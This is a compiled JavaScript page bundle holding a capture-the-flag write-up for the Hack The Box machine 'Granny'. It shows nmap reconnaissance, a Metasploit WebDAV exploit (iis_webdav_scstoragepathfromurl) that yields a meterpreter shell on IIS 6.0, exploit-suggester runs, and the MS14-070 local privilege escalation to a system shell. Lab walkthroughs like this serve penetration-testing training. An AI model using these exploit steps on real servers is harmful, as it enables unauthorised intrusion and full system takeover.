(window.webpackJsonp=window.webpackJsonp||[]).push([[76],{417:function(e,s,t){"use strict";t.r(s);var a=t(13),n=Object(a.a)({},(function(){var e=this,s=e._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[s("h1",{attrs:{id:"granny"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#granny"}},[e._v("#")]),e._v(" Granny")]),e._v(" "),s("p",[e._v("IP: "),s("code",[e._v("10.10.10.15")])]),e._v(" "),s("h2",{attrs:{id:"nmap-scan"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#nmap-scan"}},[e._v("#")]),e._v(" Nmap scan")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[e._v("nmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-A")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-T5")]),e._v(" -p- "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("10.10")]),e._v(".10.15\n")])])]),s("p",[e._v("results")]),e._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 09:38 EDT\nNmap scan report for 10.10.10.15\nHost is up (0.22s latency).\nNot shown: 999 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 6.0\n| http-methods: \n|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT\n|_http-server-header: Microsoft-IIS/6.0\n|_http-title: Under Construction\n| http-webdav-scan: \n|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK\n|   Server Type: Microsoft-IIS/6.0\n|   WebDAV type: Unknown\n|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH\n|_  Server Date: Sun, 12 Apr 2020 13:42:05 GMT\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 22.69 seconds\n")])])]),s("h2",{attrs:{id:"port-analysis"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#port-analysis"}},[e._v("#")]),e._v(" Port analysis")]),e._v(" "),s("p",[e._v("Going to port 80, we see the same error message that was seen for grandpa. So let's also try the same method as we did for the Grandpa box.")]),e._v(" "),s("h2",{attrs:{id:"metasploit-webdav-scan"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#metasploit-webdav-scan"}},[e._v("#")]),e._v(" Metasploit WebDAV scan")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[e._v("msfconsole\nuse exploit/windows/iis/iis_webdav_scstoragepathfromurl\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("set")]),e._v(" RHOSTS "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("10.10")]),e._v(".10.15\nrun\n")])])]),s("p",[e._v("meterpreter shell spawned here. Now to escelate privelage just like grandpa")]),e._v(" "),s("h3",{attrs:{id:"method-1"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#method-1"}},[e._v("#")]),e._v(" Method 1")]),e._v(" "),s("p",[e._v("Getting system info:")]),e._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("Host Name:                 GRANNY\nOS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition\nOS Version:                5.2.3790 Service Pack 2 Build 3790\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Standalone Server\nOS Build Type:             Uniprocessor Free\nRegistered Owner:          HTB\nRegistered Organization:   HTB\nProduct ID:                69712-296-0024942-44782\nOriginal Install Date:     4/12/2017, 5:07:40 PM\nSystem Up Time:            0 Days, 1 Hours, 6 Minutes, 58 Seconds\nSystem Manufacturer:       VMware, Inc.\nSystem Model:              VMware Virtual Platform\nSystem Type:               X86-based PC\nProcessor(s):              1 Processor(s) Installed.\n                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz\nBIOS Version:              INTEL  - 6040000\nWindows Directory:         C:\\WINDOWS\nSystem Directory:          C:\\WINDOWS\\system32\nBoot Device:               \\Device\\HarddiskVolume1\nSystem Locale:             en-us;English (United States)\nInput Locale:              en-us;English (United States)\nTime Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk\nTotal Physical Memory:     1,023 MB\nAvailable Physical Memory: 756 MB\nPage File: Max Size:       2,470 MB \nPage File: Available:      2,291 MB\nPage File: In Use:         179 MB\nPage File Location(s):     C:\\pagefile.sys\nDomain:                    HTB\nLogon Server:              N/A\nHotfix(s):                 1 Hotfix(s) Installed.\n                           [01]: Q147222\nNetwork Card(s):           N/A\n")])])]),s("p",[e._v("copying the info to "),s("code",[e._v("systeminfo.txt")]),e._v(" and running")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[e._v("windows-exploit-suggester.py "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-d")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("2020")]),e._v("-04-10-mssb.xls "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-i")]),e._v(" systeminfo.txt\n")])])]),s("h3",{attrs:{id:"method-2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#method-2"}},[e._v("#")]),e._v(" Method 2")]),e._v(" "),s("p",[e._v("Another way of searching for exploits in a meterpreter session is by using the suggester of metasploit")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[e._v("background "),s("span",{pre:!0,attrs:{class:"token comment"}},[e._v("# background the meterpreter session")]),e._v("\nsearch suggester\nuse multi/recon/local_exploit_suggester\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("set")]),e._v(" session "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("<")]),s("span",{pre:!0,attrs:{class:"token environment constant"}},[e._v("SESSION")]),e._v(" ID"),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v("\nrun\n")])])]),s("h1",{attrs:{id:"priv-esc"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#priv-esc"}},[e._v("#")]),e._v(" Priv esc")]),e._v(" "),s("p",[e._v("Next, migrating to this process for a more stable meterpreter session:")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token number"}},[e._v("2428")]),e._v("  "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("592")]),e._v("   davcdata.exe\n")])])]),s("p",[e._v("Now running the same exploit as grandpa MS-14-070")]),e._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[e._v("background "),s("span",{pre:!0,attrs:{class:"token comment"}},[e._v("# background the meterpreter session")]),e._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[e._v("# Using the rapid7 doc for MS14-070 exploit")]),e._v("\nuse exploit/windows/local/ms14_070_tcpip_ioctl\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("set")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token environment constant"}},[e._v("SESSION")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("<")]),e._v("meterpreter session id"),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v("\nexploit\n")])])]),s("p",[e._v("and we have our root shell.")])])}),[],!1,null,null,null);s.default=n.exports}}]);